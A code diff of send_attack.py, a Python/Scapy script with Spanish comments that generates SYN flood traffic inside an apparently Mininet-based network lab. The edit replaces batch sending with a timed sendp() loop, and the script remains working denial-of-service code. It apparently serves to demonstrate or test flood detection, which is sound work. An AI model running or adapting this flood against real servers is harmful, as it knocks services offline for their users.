@@ -3,22 +3,24 @@
 send_attack.py — Generador de tráfico SYN Flood.
 
 Simula un ataque SYN Flood desde h2 (10.0.1.82, atacante) hacia h3 (servidor).
+Usa sendp() (Layer 2) directamente — no requiere tcpreplay.
 
 Ejecutar desde Mininet en h2:
     mininet> h2 python3 send_attack.py &
 
 O directamente:
-    python3 send_attack.py [--dst 10.0.6.1] [--pps 200] [--duration 60]
+    python3 send_attack.py [--dst 10.0.6.1] [--pps 50] [--duration 60]
 """
 
 import argparse
 import random
-from scapy.all import *
+import time
+from scapy.all import Ether, IP, TCP, get_if_hwaddr, sendp
 
 DEFAULT_DST      = '10.0.6.1'
 DEFAULT_DST_PORT = 80
-DEFAULT_PPS      = 200     # paquetes por segundo
-DEFAULT_DURATION = 60      # segundos de ataque
+DEFAULT_PPS      = 50     # paquetes por segundo (aproximado — Python tiene overhead)
+DEFAULT_DURATION = 60     # segundos de ataque
 
 
 def main():
@@ -29,28 +31,31 @@ def main():
     parser.add_argument('--duration', type=int, default=DEFAULT_DURATION,  help='Duración en segundos')
     args = parser.parse_args()
 
-    iface = 'eth0'
-    print(f"[ATTACK] SYN Flood: {args.dst}:{args.dport} a {args.pps} pps durante {args.duration}s")
+    iface   = 'eth0'
+    src_mac = get_if_hwaddr(iface)
+    interval = 1.0 / max(args.pps, 1)   # segundos entre paquetes
+
+    print(f"[ATTACK] SYN Flood: {args.dst}:{args.dport} a ~{args.pps} pps durante {args.duration}s")
     print(f"[ATTACK] Interfaz: {iface}  |  Ctrl+C para detener\n")
 
-    # Generar lote de paquetes SYN con IPs y puertos fuente aleatorios
-    # (simula un botnet con muchas IPs, pero en la demo la IP real es h2)
-    pkts = [
-        Ether(src=get_if_hwaddr(iface), dst='ff:ff:ff:ff:ff:ff') /
-        IP(src='10.0.1.82', dst=args.dst) /
-        TCP(sport=random.randint(1024, 65535), dport=args.dport, flags='S',
-            seq=random.randint(0, 2**32 - 1))
-        for _ in range(args.pps * min(args.duration, 10))  # prellenar hasta 10s de paquetes
-    ]
+    count    = 0
+    end_time = time.time() + args.duration
 
     try:
-        sendpfast(pkts, pps=args.pps, loop=max(1, args.duration // 10), iface=iface)
-    except Exception as e:
-        print(f"[ATTACK ERROR] {e}")
-        print("[ATTACK] Fallback: sending via sendp() (Layer 2, bypasses routing)")
-        # Fallback a sendp() — send() falla porque h2 no tiene ruta a 10.0.6.1
-        for pkt in pkts[:args.pps]:
+        while time.time() < end_time:
+            pkt = (Ether(src=src_mac, dst='ff:ff:ff:ff:ff:ff') /
+                   IP(src='10.0.1.82', dst=args.dst) /
+                   TCP(sport=random.randint(1024, 65535),
+                       dport=args.dport,
+                       flags='S',
+                       seq=random.randint(0, 2**32 - 1)))
             sendp(pkt, iface=iface, verbose=False)
+            count += 1
+            time.sleep(interval)
+    except KeyboardInterrupt:
+        pass
+
+    print(f"\n[ATTACK] Finalizado. Enviados {count} paquetes SYN en {args.duration}s.")
 
 
 if __name__ == '__main__':
